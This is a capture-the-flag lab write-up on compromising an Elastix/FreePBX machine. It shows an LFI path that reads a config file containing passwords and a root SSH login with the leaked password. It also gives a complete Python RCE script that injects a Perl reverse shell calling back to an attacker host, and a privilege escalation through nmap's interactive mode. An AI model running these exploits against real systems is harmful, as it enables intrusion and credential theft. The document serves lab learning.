## Nmap

As always. I'm gonna run the Nmap scan against this IP address `10.10.10.7`.  Here is the result of the scan

### the result

```

that's bunch of the open ports on this machine. 

### Webserver

This machine has apache running on `port 80`. When I visited the page it was redirected into `port 443` which is the Elastix login page.

![](elastix_login_page.png)

### Gobuster
Well, I'm gonna run the `gobuster` on this webserver. Try to find any hidden directory on it. I'm gonna use the `PHP` as `-x` extension because this server running on PHP.

![](gobuster.png)

### /admin

The `/admin` really does sound good to me. When I visited the admin page. It's prompt me with `login forms`.

![](admin_login.png)

I try a bunch of passwords such as `admin:admin` but it doesn't work. However, when I clicked the `cancel` button. It goes to this page `https://10.10.10.7/admin/config.php` and displays the `Unauthorized` message.

![](freepbx_cancel.png)

### Local File Inclusion/LFI
This box has an `LFI` tag on it. I know it sounds not fair at all but information matters. 
So, I'm run the `searchsploit` and found this.

![](elastix_lfi.png)

I'm gonna mirror/copy this exploit in my current directory with `-m` flag. Here is the exploit/PoC :
```js
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

it's basically, using `current_language` as the parameter. This `PoC` already includes the `config file` on it. I'm gonna copy/paste this in my browser and VOILA!

![](conf_file.png)

I managed to grab a bunch of passwords that appear in this file but a lot of passwords seem to be `commented` out. 
Just one password does not get commented out and appears more often in here.

## Method: 1

### SSH

The Nmap scan result shows us `port 22` is open. Well, I've got the potential password and don't know what users it belongs to. So, I'm gonna try my luck to go with the `root` user

```
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

If you get one of these errors just like me. You need to run an ssh command like this

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
```

source - [Solution for SSH unable to Negotiate Errors](https://www.infosecmatter.com/solution-for-ssh-unable-to-negotiate-errors/)

![](ssh_root.png)

Finally, I login in as root through `SSH`. Let's get the `user` and `root` flags.

### the flag

![](the_flag.png)

## Method: 2

### RCE

The last exploit I'm using was `LFI 'graph.php'` and the version of `Elastix` was `2.2.0` and this `RCE` have the same version of Elastix.

![](rce_freepbx.png)

As always, I'm gonna mirror/copy this exploit into my current working directory with the `-m` flag. When I ran the exploit it shows a bunch of errors regard to `SSL`. I tried fixing the error by changing the python code and it was painful but I managed to fix it. Here is the code:

### 18650.py3

```python
#!/usr/bin/python3
import ssl, urllib3

rhost = "10.10.10.7"
lhost = input("lhost>: ") 
lport = input("lport>: ")        
ext = input("ext>: ")
head = f"https://{rhost}/recordings/misc/callme_page.php?action=c&callmenum={ext}@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20"
payload = f"perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22{lhost}%3a{lport}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'"
url = head + payload

# SSL Handler
urllib3.disable_warnings()
http = urllib3.PoolManager(cert_reqs="CERT_NONE")

# Execute
print("ExPl0itInG...")
http.request("GET", url)
```

### svwar/SIPVicious
I ran the exploit one more time and it doesn't work. I'm speechless and I saw the `extension` in the original script that set the value into `1000` and maybe this is not a valid extension. So, I'm gonna run the `svwar/SIPVicious` tool to identify a working extension.
 
I'm gonna run this command:
```bash
svwar -m INVITE -e100-400 10.10.10.7
```
 
![](svwar.png)
 
## Shell as Asterisk
Now, let's run the exploit again and make sure to set up the Netcat listener first.
 
![](shell.png)
 
YES! it worked. Based on the comment in the original exploit, I can be a root user by using `nmap --interactive`. Let's do it. 
 
![](nmap_root.png)

TADAA!! Now, I'm a root user.
